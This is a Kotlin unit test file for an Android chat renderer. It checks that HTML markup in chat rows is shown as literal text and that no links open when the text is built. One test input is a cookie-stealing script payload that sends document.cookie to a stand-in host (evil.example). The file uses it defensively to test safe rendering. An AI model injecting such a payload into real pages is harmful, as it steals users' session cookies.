package ai.namastex.automagik

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * What the chat hands Compose's [androidx.compose.material3.Text]: an AnnotatedString whose characters are the row's
 * own, so markup shows as the characters it is. The only annotations are tap-only links; building it opens nothing.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35])
class ChatRenderTest {
    private fun drawn(text: String, opened: MutableList<String>) =
        (ChatText.blocks(text).single() as ChatText.Prose).let { chatAnnotated(it.spans) { url -> opened += url } }

    @Test fun imgTagIsDrawnAsItsCharactersWithNothingToLoad() {
        val opened = mutableListOf<String>()
        val shown = drawn("<img src=x>", opened)
        assertEquals("<img src=x>", shown.text)
        assertTrue(shown.getLinkAnnotations(0, shown.length).isEmpty())
        assertTrue(shown.spanStyles.isEmpty() && shown.paragraphStyles.isEmpty())
        assertTrue(opened.isEmpty())
    }

    @Test fun scriptTagIsDrawnAsItsCharactersAndRunsNothing() {
        val opened = mutableListOf<String>()
        val text = "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        val shown = drawn(text, opened)
        assertEquals(text, shown.text)
        // The URL inside is a link span over its own target, and building the text opened nothing.
        val links = shown.getLinkAnnotations(0, shown.length)
        assertEquals(listOf("https://evil.example/steal?c="), links.map { shown.text.substring(it.start, it.end) })
        assertTrue(opened.isEmpty())
    }
}
